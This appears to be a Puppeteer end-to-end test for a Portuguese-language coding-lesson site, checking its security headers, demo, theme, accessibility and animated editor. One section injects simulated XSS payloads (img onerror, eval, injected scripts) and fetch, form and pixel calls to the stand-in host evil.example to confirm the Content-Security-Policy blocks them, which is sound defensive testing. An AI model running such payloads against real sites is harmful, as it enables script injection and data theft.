// Teste de navegador (npm run e2e): serve dist/ com os MESMOS cabeçalhos da política e confere, num Chrome/Edge de verdade, que
// (1) o site funciona sem violar a própria CSP, (2) o demo e o tema funcionam, (3) a política bloqueia ataques simulados,
// em duas camadas, e (4) a acessibilidade passa no axe-core em 4 configurações. Rode depois de `npm run build`.
// Precisa de um navegador Chromium: use CHROME_PATH para indicar o caminho, se não for um dos comuns.
import { createServer } from "node:http";
import { readFileSync, existsSync, statSync, mkdirSync } from "node:fs";
import path from "node:path";
import puppeteer from "puppeteer-core";
import axeCore from "axe-core";

const SITE = path.resolve(import.meta.dirname, "..");
const DIST = path.join(SITE, "dist");
const { SECURITY_HEADERS, CACHE_RULES } = await import(new URL("../security/policy.mjs", import.meta.url).href);

const TYPES = { ".html": "text/html; charset=utf-8", ".css": "text/css; charset=utf-8", ".js": "text/javascript; charset=utf-8", ".woff2": "font/woff2", ".png": "image/png", ".svg": "image/svg+xml", ".txt": "text/plain; charset=utf-8" };

// Servidor estático que aplica os MESMOS cabeçalhos de public/_headers (vindos da política).
// Script do "atacante": roda como código da PRÓPRIA página (mesmo domínio), tentando o que uma CSP fraca deixaria passar.
const ATTACK = `
const results = {};
const t = (name, fn) => { try { results[name] = "executou: " + String(fn()); } catch (e) { results[name] = "bloqueado: " + e.name; } };
t("eval", () => eval("window.__pwned = 'eval'; 1 + 1"));
t("new Function", () => new Function("window.__pwned = 'function'")());
t("setTimeout com texto", () => { setTimeout("window.__pwned = 'timeout'", 0); return "agendado"; });
t("document.write", () => { document.write("<img src=x onerror=\\"window.__pwned='write'\\">"); return "escrito"; });
t("manipulador onclick inline", () => { const b = document.createElement("button"); b.setAttribute("onclick", "window.__pwned = 'onclick'"); document.body.appendChild(b); b.click(); return "clicou"; });
window.__attackResults = results;
`;
const server = createServer((req, res) => {
  const reqUrl = new URL(req.url ?? "/", "http://x");
  if (reqUrl.pathname === "/__attack.js") {
    const headers = { "Content-Type": "text/javascript; charset=utf-8" };
    for (const [k, v] of SECURITY_HEADERS) headers[k] = v;
    res.writeHead(200, headers);
    return res.end(ATTACK);
  }
  let p = decodeURIComponent(reqUrl.pathname);
  if (p === "/") p = "/index.html";
  let file = path.join(DIST, p);
  if (!existsSync(file) || statSync(file).isDirectory()) file = existsSync(file + ".html") ? file + ".html" : path.join(DIST, "404.html");
  const status = file.endsWith("404.html") && !p.endsWith("404.html") ? 404 : 200;
  const headers = { "Content-Type": TYPES[path.extname(file)] ?? "application/octet-stream" };
  const noTT = (csp) => csp.replace(/;?s*require-trusted-types-for 'script'/, "").replace(/;?s*trusted-types 'none'/, "");
  for (const [k, v] of SECURITY_HEADERS) headers[k] = reqUrl.searchParams.get("nott") && k === "Content-Security-Policy" ? noTT(v) : v;
  for (const rule of CACHE_RULES) if (p.startsWith(rule.pattern.replace("*", ""))) headers["Cache-Control"] = rule.value;
  res.writeHead(status, headers);
  let body = readFileSync(file);
  if (reqUrl.searchParams.get("attack") && file.endsWith("index.html")) {
    let html = body.toString().replace("</body>", '<script src="/__attack.js"></script></body>');
    if (reqUrl.searchParams.get("nott")) html = html.replace(/(<meta http-equiv="Content-Security-Policy" content=")([^"]*)"/, (_m, a, csp) => a + noTT(csp) + '"');
    body = Buffer.from(html);
  }
  res.end(body);
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const URL_BASE = `http://127.0.0.1:${server.address().port}`;

const results = [];
const check = (ok, name, detail = "") => { results.push(ok); console.log(`  ${ok ? "✔" : "✖"} ${name}${detail ? "  [" + detail + "]" : ""}`); };

const CANDIDATES = [process.env["CHROME_PATH"], "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe", "C:/Program Files/Google/Chrome/Application/chrome.exe", "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium", "/usr/bin/chromium-browser", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"].filter(Boolean);
const executablePath = CANDIDATES.find((p) => existsSync(p));
if (!executablePath) throw new Error("nenhum Chrome/Edge encontrado: defina CHROME_PATH");
const browser = await puppeteer.launch({ executablePath, headless: true, args: process.env["CI"] ? ["--no-sandbox"] : [] });
try {
  // ------------------------------------------------------------------ 1) o site funciona sem violar a CSP
  console.log("\n1) O site funcionando, sem violar a própria política");
  const page = await browser.newPage();
  const consoleErrors = [], failed = [], requests = [];
  page.on("console", (m) => { if (["error", "warning"].includes(m.type())) consoleErrors.push(`${m.type()}: ${m.text().slice(0, 160)}`); });
  page.on("pageerror", (e) => consoleErrors.push("pageerror: " + e.message));
  page.on("requestfailed", (r) => failed.push(r.url()));
  page.on("request", (r) => requests.push(r.url()));
  await page.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  await page.setViewport({ width: 1280, height: 900 });
  const response = await page.goto(URL_BASE + "/", { waitUntil: "networkidle0" });
  const h = response.headers();
  check((h["content-security-policy"] ?? "").includes("default-src 'none'") && (h["content-security-policy"] ?? "").includes("frame-ancestors 'none'"), "CSP em cabeçalho HTTP, com frame-ancestors 'none'");
  for (const name of ["strict-transport-security", "x-content-type-options", "x-frame-options", "referrer-policy", "permissions-policy", "cross-origin-opener-policy", "cross-origin-resource-policy"]) check(Boolean(h[name]), `cabeçalho ${name}`, h[name]?.slice(0, 40));
  check((await page.evaluate(() => window.__violations)).length === 0, "zero violações de CSP ao carregar a página", JSON.stringify(await page.evaluate(() => window.__violations)));
  check(consoleErrors.length === 0, "zero erros ou avisos no console", consoleErrors.join(" | "));
  check(failed.length === 0, "nenhuma requisição falhou", failed.join(", "));
  const origins = new Set(requests.map((u) => new URL(u).origin));
  check(origins.size === 1 && origins.has(URL_BASE), "TODAS as requisições vão para o próprio site (nada de terceiros)", [...origins].join(", "));
  const fonts = await page.evaluate(async () => { await document.fonts.ready; return [document.fonts.check("16px Nunito"), document.fonts.check("16px 'JetBrains Mono'")]; });
  check(fonts[0] && fonts[1], "fontes próprias carregadas (Nunito e JetBrains Mono)");
  check(await page.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth), "sem rolagem horizontal no desktop");

  // ------------------------------------------------------------------ 2) o demo funciona (mouse e teclado)
  console.log("\n2) O demo interativo (mouse, teclado e meta do dia)");
  const verdict = async () => page.evaluate(() => document.querySelector('[data-role="verdict"]').textContent);
  await page.click(".opt:nth-child(1)"); // A) undefined: errada
  check((await verdict()).includes("Errou"), "clique numa alternativa errada mostra o resultado", await verdict());
  check(await page.evaluate(() => document.querySelector('[data-role="card"]').className.includes("bad")), "cartão ganha a borda de erro");
  await page.click('[data-role="next"]');
  await page.keyboard.press("d"); // D) correta em ds-001
  check((await verdict()).includes("Acertou"), "tecla D responde pelo teclado", await verdict());
  let goal = "";
  for (let i = 0; i < 3; i++) { await page.click('[data-role="next"]'); await page.keyboard.press("a"); }
  goal = await page.evaluate(() => document.querySelector('[data-role="party"]').textContent + " | " + document.querySelector('[data-role="footer"]').innerText.replace(/\n/g, " "));
  check(/Meta do dia cumprida/.test(goal), "na 5ª resposta, aparece 'Meta do dia cumprida!' (+15 XP)", goal.slice(0, 90));

  // ------------------------------------------------------------------ 3) tema
  console.log("\n3) Botão de tema");
  const themeOf = () => page.evaluate(() => document.documentElement.dataset.theme ?? "auto");
  await page.click("#theme-toggle");
  check((await themeOf()) === "light", "1º clique: tema claro");
  await page.click("#theme-toggle");
  check((await themeOf()) === "dark", "2º clique: tema escuro");
  await page.reload({ waitUntil: "networkidle0" });
  check((await themeOf()) === "dark", "a escolha persiste ao recarregar (aplicada antes da pintura)");
  await page.click("#theme-toggle");
  check((await themeOf()) === "auto", "3º clique: volta ao automático");

  // ------------------------------------------------------------------ 4) ataques simulados
  console.log("\n4) Ataques simulados: a política precisa bloquear TODOS");
  await page.evaluate(() => { window.__violations = []; });
  const attack = async (name, fn, expect) => {
    await page.evaluate(() => { window.__pwned = undefined; window.__violations = []; });
    const outcome = await page.evaluate(async (code) => {
      try { await new Function("return (async()=>{" + code + "})()")(); return "executou"; } catch (e) { return "bloqueado: " + e.name; }
    }, fn);
    await new Promise((r) => setTimeout(r, 150));
    const pwned = await page.evaluate(() => window.__pwned);
    const violations = await page.evaluate(() => window.__violations);
    check(pwned === undefined && expect(outcome, violations), name, `${outcome}${violations.length ? " | violação: " + violations[0].slice(0, 60) : ""}`);
  };
  // new Function é ele mesmo um sink de eval: sob a política já não funciona. Os ataques usam as APIs diretamente quando preciso.
  const direct = async (name, fn, expectBlocked) => {
    await page.evaluate(() => { window.__pwned = undefined; window.__violations = []; });
    const outcome = await page.evaluate(fn);
    await new Promise((r) => setTimeout(r, 200));
    const pwned = await page.evaluate(() => window.__pwned);
    const violations = await page.evaluate(() => window.__violations);
    const blocked = pwned === undefined && expectBlocked(outcome, violations);
    check(blocked, name, `${outcome}${violations.length ? " | violação: " + violations[0].slice(0, 70) : ""}`);
  };
  await direct("innerHTML com <img onerror> é bloqueado (Trusted Types)", () => { try { document.body.innerHTML += '<img src=x onerror="window.__pwned=1">'; return "executou"; } catch (e) { return "bloqueado: " + e.name; } }, (o) => o.startsWith("bloqueado"));
  await direct("<script> injetado com texto é bloqueado", () => { try { const s = document.createElement("script"); s.textContent = "window.__pwned = 1"; document.head.appendChild(s); return "inserido"; } catch (e) { return "bloqueado: " + e.name; } }, (o, v) => o.startsWith("bloqueado") || v.length > 0);
  await direct("<script src> de outro domínio é bloqueado", () => { try { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; document.head.appendChild(s); return "inserido"; } catch (e) { return "bloqueado: " + e.name; } }, (o, v) => o.startsWith("bloqueado") || v.length > 0);
  await direct("estilo inline injetado não vale", () => { try { const s = document.createElement("style"); s.textContent = "body{display:none!important}"; document.head.appendChild(s); } catch { /* ok */ } return getComputedStyle(document.body).display; }, (o) => o !== "none");
  await direct("imagem de rastreamento (outro domínio) é bloqueada", () => new Promise((resolve) => { const i = new Image(); i.onload = () => resolve("carregou"); i.onerror = () => resolve("bloqueado"); i.src = "https://evil.example/pixel.gif"; }), (o, v) => o === "bloqueado" && v.some((x) => x.startsWith("img-src")));
  await direct("fetch para outro domínio é bloqueado", async () => { try { await fetch("https://evil.example/steal"); return "enviou"; } catch (e) { return "bloqueado: " + e.name; } }, (o, v) => o.startsWith("bloqueado") && v.some((x) => x.startsWith("connect-src")));
  await direct("formulário não envia dados para fora (form-action)", () => { const f = document.createElement("form"); f.action = "https://evil.example/"; f.method = "post"; document.body.appendChild(f); f.submit(); return "tentou enviar"; }, (_o, v) => v.some((x) => x.startsWith("form-action")));
  await direct("<iframe> não é permitido", () => { const f = document.createElement("iframe"); f.src = "https://evil.example/"; document.body.appendChild(f); return "inserido"; }, (_o, v) => v.some((x) => x.startsWith("frame-src") || x.startsWith("default-src")));

  console.log("   ...e agora como código da própria página (script do mesmo domínio tentando eval, new Function e afins)");
  const victim = await browser.newPage();
  await victim.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(e.violatedDirective + " " + (e.blockedURI || "")));
  });
  await victim.goto(URL_BASE + "/?attack=1", { waitUntil: "networkidle0" });
  await new Promise((r) => setTimeout(r, 400));
  const attackResults = await victim.evaluate(() => window.__attackResults);
  const attackViolations = await victim.evaluate(() => window.__violations);
  const attackPwned = await victim.evaluate(() => window.__pwned);
  for (const name of ["eval", "new Function", "setTimeout com texto", "document.write", "manipulador onclick inline"]) {
    const outcome = attackResults?.[name] ?? "(sem resultado)";
    const blockedBySync = outcome.startsWith("bloqueado");
    const blockedAsync = name === "setTimeout com texto" || name === "manipulador onclick inline"; // o bloqueio dessas aparece como violação, não como exceção
    check(blockedBySync || blockedAsync, name + " é bloqueado quando o código vem da própria página", outcome);
  }
  check(attackPwned === undefined, "NENHUM dos ataques conseguiu executar código (window.__pwned continua indefinido)", String(attackPwned));
  check(attackViolations.some((v) => v.startsWith("require-trusted-types-for")), "camada 1 (Trusted Types) registrou a violação", [...new Set(attackViolations)].join(" | ").slice(0, 100));
  await victim.close();

  // camada 2: a MESMA investida contra uma cópia da política sem Trusted Types. Agora quem bloqueia é o script-src.
  const layered = await browser.newPage();
  await layered.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(e.violatedDirective + " " + (e.blockedURI || "")));
  });
  await layered.goto(URL_BASE + "/?attack=1&nott=1", { waitUntil: "networkidle0" });
  await new Promise((r) => setTimeout(r, 500));
  const layeredResults = await layered.evaluate(() => window.__attackResults);
  const layeredViolations = await layered.evaluate(() => window.__violations);
  const layeredPwned = await layered.evaluate(() => window.__pwned);
  const layeredPolicy = await layered.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]').content);
  check(!layeredPolicy.includes("trusted-types"), "(controle) a cópia da política realmente NÃO tem Trusted Types");
  check(layeredPwned === undefined, "camada 2 (script-src sozinho): nenhum ataque executou código", String(layeredPwned));
  check(layeredResults?.["eval"]?.startsWith("bloqueado") && layeredResults?.["new Function"]?.startsWith("bloqueado"), "camada 2: eval e new Function bloqueados pelo script-src", `${layeredResults?.["eval"]} / ${layeredResults?.["new Function"]}`);
  check(layeredViolations.some((v) => v.startsWith("script-src")) && layeredViolations.some((v) => v.startsWith("script-src-attr")), "camada 2: violações de script-src (eval/timeout) e script-src-attr (onclick inline) registradas", [...new Set(layeredViolations)].join(" | ").slice(0, 120));
  await layered.close();

  // ------------------------------------------------------------------ 5) acessibilidade (axe-core) em 4 configurações
  console.log("\n5) Acessibilidade (axe-core), 4 configurações");
  for (const [name, w, hh, scheme] of [["desktop claro", 1280, 900, "light"], ["desktop escuro", 1280, 900, "dark"], ["celular claro", 400, 800, "light"], ["celular escuro", 400, 800, "dark"]]) {
    const p = await browser.newPage();
    await p.emulateMediaFeatures([{ name: "prefers-color-scheme", value: scheme }]);
    await p.setViewport({ width: w, height: hh });
    await p.goto(URL_BASE + "/", { waitUntil: "networkidle0" });
    // o CSP bloqueia injetar o axe pela página; usa o Chrome DevTools para rodar o código de fora da política
    const client = await p.createCDPSession();
    await client.send("Page.setBypassCSP", { enabled: true });
    await p.reload({ waitUntil: "networkidle0" });
    await p.evaluate(axeCore.source);
    const violations = await p.evaluate(async () => (await window.axe.run(document)).violations.map((v) => `${v.id}(${v.nodes.length}): ${v.nodes[0].target.join(" ")}`));
    const overflow = await p.evaluate(() => document.documentElement.scrollWidth > document.documentElement.clientWidth);
    check(violations.length === 0 && !overflow, `${name}: zero violações de acessibilidade e sem rolagem horizontal`, violations.join(" | "));
    await p.close();
  }

  // ------------------------------------------------------------------ 6) 404 e links
  console.log("\n6) Página 404 e links");
  const notFound = await browser.newPage();
  const nf = await notFound.goto(URL_BASE + "/nao-existe", { waitUntil: "networkidle0" });
  check(nf.status() === 404 && (await notFound.title()).includes("não encontrada"), "página inexistente devolve 404 com a página própria", `status ${nf.status()}`);
  const links = await page.evaluate(() => [...document.querySelectorAll("a[target=_blank]")].map((a) => `${new URL(a.href).hostname} rel=${a.rel}`));
  check(links.length > 0 && links.every((l) => /rel=.*noopener/.test(l) && /rel=.*noreferrer/.test(l)), "todo link externo abre com rel noopener noreferrer", [...new Set(links)].join("; "));

  // ------------------------------------------------------------------ 7) editor de código animado
  console.log("\n7) Editor de código animado (digitação, abas, botão de parar, teclado e menos movimento)");
  const SHOTS = process.env["E2E_SHOTS"]; // com E2E_SHOTS=pasta, guarda capturas de tela (o CI as deixa como artefato para revisão visual)
  if (SHOTS) mkdirSync(SHOTS, { recursive: true });
  const shoot = async (target, name) => { if (SHOTS && target) await target.screenshot({ path: path.join(SHOTS, `${name}.png`) }); };
  const bank = JSON.parse(readFileSync(path.join(SITE, "..", "src", "data", "challenges.json"), "utf8"));
  const codeOf = (id) => bank.find((c) => c.id === id)?.code;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const SHOWN = "#editor .ide-panel:not([hidden]) .code .line";

  const ed = await browser.newPage();
  const edProblems = [];
  ed.on("console", (m) => { if (["error", "warning"].includes(m.type())) edProblems.push(`${m.type()}: ${m.text().slice(0, 140)}`); });
  ed.on("pageerror", (e) => edProblems.push("pageerror: " + e.message));
  await ed.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  await ed.setViewport({ width: 1280, height: 700 }); // baixa de propósito: o editor começa fora da tela
  await ed.goto(URL_BASE + "/", { waitUntil: "networkidle0" });
  const typed = () => ed.evaluate((selector) => [...document.querySelectorAll(selector)].map((l) => l.textContent).join("\n"), SHOWN);
  const statusText = () => ed.evaluate(() => document.querySelector('#editor [data-role="pos"]').textContent);
  const carets = () => ed.evaluate(() => document.querySelectorAll("#editor .caret").length);
  const toggleLabel = () => ed.evaluate(() => document.querySelector('#editor [data-role="toggle"]').textContent);
  const selectedTab = () => ed.evaluate(() => document.querySelector('#editor [role="tab"][aria-selected="true"]').id);
  const withoutBlankTail = (text) => text.replace(/\n+$/, "");

  // 7a) o que a tela e o leitor de tela mostram, antes de qualquer animação
  const panels = await ed.evaluate(() => [...document.querySelectorAll("#editor .ide-panel")].map((p) => ({
    id: p.dataset.id,
    shown: [...p.querySelectorAll(".code .line")].map((l) => l.textContent).join("\n"),
    sr: p.querySelector(".sr").textContent,
    colored: p.querySelectorAll(".tk.k, .tk.s, .tk.n, .tk.f, .tk.t, .tk.c").length,
    hiddenFromReaders: p.querySelector(".code").getAttribute("aria-hidden") === "true",
    visible: getComputedStyle(p).visibility !== "hidden",
  })));
  check(panels.length === 6 && panels.filter((p) => p.visible).length === 1, "o editor tem 6 arquivos (abas) e só 1 painel visível", `${panels.length} painéis, ${panels.filter((p) => p.visible).length} visível`);
  const wrong = panels.filter((p) => p.shown !== codeOf(p.id) || p.sr !== codeOf(p.id)).map((p) => p.id);
  check(wrong.length === 0, "o texto da tela e a cópia do leitor de tela são IDÊNTICOS ao código do desafio, nos 6 arquivos (a colorização não perdeu nem mudou nada)", wrong.join(", "));
  check(panels.every((p) => p.colored > 0 && p.hiddenFromReaders), "todo arquivo vem colorido, e o texto animado fica escondido do leitor de tela (que lê a cópia)", panels.map((p) => p.colored).join("/"));
  const top = await ed.evaluate(() => document.getElementById("editor").getBoundingClientRect().top);
  check(top >= 700 && (await carets()) === 0 && (await typed()) === codeOf(panels[0].id), "fora da tela o editor fica parado: código inteiro e sem cursor", `topo em ${Math.round(top)}px`);
  const termAnimation = await ed.evaluate(() => ({ text: document.querySelector(".term code").textContent, name: getComputedStyle(document.querySelector(".term code")).animationName }));
  check(termAnimation.text === "@Devlingo aprender" && termAnimation.name.includes("type"), "o comando do topo está inteiro no HTML e se digita só com CSS", JSON.stringify(termAnimation));

  // 7b) ao aparecer na tela, digita (com o cursor) até o fim
  const first = codeOf(panels[0].id);
  await ed.evaluate(() => document.getElementById("editor").scrollIntoView({ block: "center" }));
  await sleep(1500);
  const partial = withoutBlankTail(await typed());
  check(partial.length > 0 && partial.length < first.length && first.startsWith(partial), "ao aparecer na tela, começa a digitar: o texto é um pedaço do começo do código", `${partial.length} de ${first.length} caracteres`);
  check((await carets()) === 1 && /^Ln \d+, Col \d+$/.test(await statusText()), "tem um cursor, e a barra de status mostra a linha e a coluna", await statusText());
  await shoot(await ed.$("#editor"), "editor-digitando");
  await ed.waitForFunction((selector, expected) => [...document.querySelectorAll(selector)].map((l) => l.textContent).join("\n") === expected, { timeout: 25_000 }, SHOWN, first).catch(() => {});
  check((await typed()) === first, "termina de digitar, e o texto final é idêntico ao código do desafio");
  const lines = first.split("\n");
  check((await statusText()) === `Ln ${lines.length}, Col ${lines[lines.length - 1].length + 1}`, "ao terminar, a barra de status aponta o fim do arquivo", await statusText());
  await shoot(await ed.$("#editor"), "editor-pronto");
  await ed.waitForFunction(() => document.querySelector('#editor [role="tab"][aria-selected="true"]').id !== "t-py-010", { timeout: 12_000 }).catch(() => {});
  check((await selectedTab()) !== "t-py-010", "sozinho, passa para o próximo arquivo depois de uns segundos", await selectedTab());

  // 7c) abas, botão de parar e teclado
  await ed.click("#t-ts-004");
  await sleep(700);
  const tsCode = codeOf("ts-004");
  const tsPartial = withoutBlankTail(await typed());
  check((await selectedTab()) === "t-ts-004" && tsPartial.length < tsCode.length && tsCode.startsWith(tsPartial), "clicar numa aba mostra aquele arquivo e digita de novo", `${tsPartial.length} de ${tsCode.length}`);
  await ed.click('#editor [data-role="toggle"]');
  check((await typed()) === tsCode && (await toggleLabel()) === "Reproduzir animação", "o botão 'Parar animação' mostra o código inteiro na hora", await toggleLabel());
  await sleep(1200);
  check((await typed()) === tsCode && (await carets()) === 0, "parado, nada mais muda e o cursor some");
  await ed.click("#t-mod-006");
  check((await typed()) === codeOf("mod-006"), "com a animação parada, trocar de aba mostra o código inteiro na hora");
  const heights = [];
  for (const id of panels.map((p) => p.id)) {
    await ed.click(`#t-${id}`);
    heights.push(await ed.evaluate(() => document.getElementById("editor").getBoundingClientRect().height));
  }
  check(Math.max(...heights) - Math.min(...heights) < 1, "trocar de aba não muda a altura do editor (a página não pula)", heights.map((h) => Math.round(h)).join("/"));
  await ed.click('#editor [data-role="toggle"]');
  await sleep(800);
  const replay = withoutBlankTail(await typed());
  check((await toggleLabel()) === "Parar animação" && replay.length < codeOf(panels[5].id).length, "'Reproduzir animação' volta a digitar", `${replay.length} caracteres`);
  await ed.focus('#editor [role="tab"][aria-selected="true"]');
  await ed.keyboard.press("Home");
  const afterHome = await selectedTab();
  await ed.keyboard.press("ArrowRight");
  const afterRight = await selectedTab();
  await ed.keyboard.press("End");
  const afterEnd = await selectedTab();
  await ed.keyboard.press("ArrowRight");
  const wrapped = await selectedTab();
  check(afterHome === `t-${panels[0].id}` && afterRight === `t-${panels[1].id}` && afterEnd === `t-${panels[5].id}` && wrapped === afterHome, "teclado nas abas: Home, seta direita, End e volta ao começo", [afterHome, afterRight, afterEnd, wrapped].join(" > "));
  check((await ed.evaluate(() => document.activeElement.id)) === wrapped, "o foco acompanha a aba escolhida pelo teclado");
  check(edProblems.length === 0 && (await ed.evaluate(() => window.__violations)).length === 0, "durante tudo isso: zero violações de CSP e zero erros no console", `${edProblems.join(" | ")} ${JSON.stringify(await ed.evaluate(() => window.__violations))}`);
  await ed.close();

  // 7d) quem pede menos movimento: nada digita sozinho, mas a pessoa pode ligar
  const calm = await browser.newPage();
  await calm.emulateMediaFeatures([{ name: "prefers-reduced-motion", value: "reduce" }]);
  await calm.setViewport({ width: 1280, height: 700 });
  await calm.goto(URL_BASE + "/", { waitUntil: "networkidle0" });
  await calm.evaluate(() => document.getElementById("editor").scrollIntoView({ block: "center" }));
  await sleep(1200);
  const calmState = await calm.evaluate((selector) => ({
    code: [...document.querySelectorAll(selector)].map((l) => l.textContent).join("\n"),
    carets: document.querySelectorAll("#editor .caret").length,
    label: document.querySelector('#editor [data-role="toggle"]').textContent,
    term: getComputedStyle(document.querySelector(".term code")).animationName,
  }), SHOWN);
  check(calmState.code === first && calmState.carets === 0 && calmState.label === "Reproduzir animação", "com 'reduzir movimento': código inteiro desde o começo, sem cursor e sem digitar sozinho", calmState.label);
  check(calmState.term === "none", "com 'reduzir movimento': o comando do topo também fica parado", calmState.term);
  await shoot(await calm.$("#editor"), "editor-reduzido");
  await calm.click('#editor [data-role="toggle"]');
  await sleep(800);
  const calmTyped = withoutBlankTail(await calm.evaluate((selector) => [...document.querySelectorAll(selector)].map((l) => l.textContent).join("\n"), SHOWN));
  check(calmTyped.length < first.length, "quem pediu menos movimento pode ligar a animação pelo botão", `${calmTyped.length} de ${first.length}`);
  await calm.close();

  // 7e) no celular o código cabe sem rolar de lado, e dá para ver capturas de tela (com E2E_SHOTS)
  for (const [name, w, hh, scheme] of [["desktop-escuro", 1280, 900, "dark"], ["desktop-claro", 1280, 900, "light"], ["celular-escuro", 400, 900, "dark"], ["celular-claro", 400, 900, "light"]]) {
    const p = await browser.newPage();
    await p.emulateMediaFeatures([{ name: "prefers-color-scheme", value: scheme }, { name: "prefers-reduced-motion", value: "reduce" }]);
    await p.setViewport({ width: w, height: hh });
    await p.goto(URL_BASE + "/", { waitUntil: "networkidle0" });
    await shoot(p, `inicio-${name}`);
    if (w < 500) {
      const overflowing = await p.evaluate(() => [...document.querySelectorAll("#editor .code")].filter((c) => c.scrollWidth > c.clientWidth + 1).length);
      check(overflowing === 0, `${name}: o código de nenhum arquivo precisa rolar de lado`, `${overflowing} com rolagem`);
    }
    await shoot(await p.$("#codigo"), `secao-editor-${name}`);
    await p.close();
  }
} finally {
  await browser.close();
  server.close();
}
const failed = results.filter((r) => !r).length;
console.log(`\n${results.length - failed}/${results.length} verificações passaram${failed ? " (HÁ FALHAS)" : ""}`);
process.exit(failed ? 1 : 0);
